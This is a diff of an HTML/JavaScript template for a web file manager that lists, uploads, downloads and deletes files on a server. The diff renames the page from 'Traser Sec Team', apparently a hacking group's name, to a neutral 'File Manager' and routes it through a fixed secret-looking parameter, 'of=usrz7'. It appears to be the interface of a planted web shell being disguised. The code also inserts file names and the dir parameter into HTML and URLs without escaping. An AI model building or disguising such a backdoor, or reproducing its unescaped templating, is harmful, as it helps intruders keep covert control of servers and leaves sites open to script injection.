@@ -3,23 +3,25 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Traser Sec Team</title>
+<title>File Manager</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
 body{margin:0;padding:20px;font-family:Inter,sans-serif;background:#fff;color:#0f172a}
-.card{max-width:900px;margin:auto;padding:16px;border-radius:12px;background:#fbfdff;box-shadow:0 5px 15px rgba(0,0,0,0.05)}
-input[type=file]{display:none}
+.card{max-width:1000px;margin:auto;padding:16px;border-radius:12px;background:#fbfdff;box-shadow:0 5px 15px rgba(0,0,0,0.05)}
 .button{padding:8px 12px;border-radius:8px;border:0;background:#0f172a;color:#fff;cursor:pointer;margin-left:4px}
 .list{margin-top:16px}
 .item{display:flex;justify-content:space-between;padding:6px 8px;border-bottom:1px solid #eef2f7;align-items:center}
-.actions a, .actions button{margin-left:6px;text-decoration:none;color:#0f172a;background:#eef2ff;padding:4px 6px;border-radius:6px;border:1px solid #e2efff;cursor:pointer;font-size:13px}
+.actions a,.actions button{margin-left:6px;text-decoration:none;color:#0f172a;background:#eef2ff;padding:4px 6px;border-radius:6px;border:1px solid #e2efff;cursor:pointer;font-size:13px}
 .actions button{background:#ffeef0;border-color:#fbb6c2;color:#b91c1c}
 .breadcrumb{margin-bottom:12px;font-size:14px;color:#6b7280}
+input[type=file]{display:none}
 </style>
 </head>
 <body>
 <div class="card">
-<div class="breadcrumb" id="breadcrumb"></div>
+<div class="breadcrumb">
+<a href="?of=usrz7&dir={{parentDir}}">../</a> {{currentDir}}
+</div>
 <div>
 <label class="button" id="filebtn">Pilih File</label>
 <input type="file" id="fileinput">
@@ -31,21 +33,19 @@ input[type=file]{display:none}
 <script>
 const FILES=JSON.parse('{{filelist}}');
 const CSRF='{{csrf}}';
-let currentDir='';
-const BASE_URL=location.pathname+location.search;
+const currentDir='{{currentDir}}';
+const BASE_URL=location.pathname+'?of=usrz7'+(currentDir?('&dir='+currentDir):'');
 const listEl=document.getElementById('filelist');
-const bcEl=document.getElementById('breadcrumb');
 document.getElementById('filebtn').onclick=_=>document.getElementById('fileinput').click();
 document.getElementById('fileinput').onchange=_=>{
   if(!document.getElementById('fileinput').files.length)return;
   document.getElementById('filebtn').textContent=document.getElementById('fileinput').files[0].name;
 }
 function renderList(){
-  bcEl.textContent=currentDir||'/';
   listEl.innerHTML=FILES.map(f=>`<div class="item">
   <span>${f}</span>
   <span class="actions">
-    <a href="download.php?file=${encodeURIComponent(f)}">Download</a>
+    <a href="download.php?file=${encodeURIComponent(f)}&dir=${currentDir}">Download</a>
     <form method="post" style="display:inline"><input type="hidden" name="file" value="${f}">
     <input type="hidden" name="csrf" value="${CSRF}"><input type="hidden" name="action" value="delete">
     <button type="submit">Delete</button></form>
@@ -55,7 +55,7 @@ function renderList(){
 function uploadFile(){
   const f=document.getElementById('fileinput').files[0];if(!f)return;
   const fd=new FormData();fd.append('file',f);fd.append('csrf',CSRF);fd.append('action','upload');
-  fetch(BASE_URL,{method:'POST',body:fd}).then(_=>location.reload());
+  fetch(BASE_URL,{method:'POST',body:fd}).then(r=>r.text()).then(_=>location.reload());
 }
 renderList();
 </script>
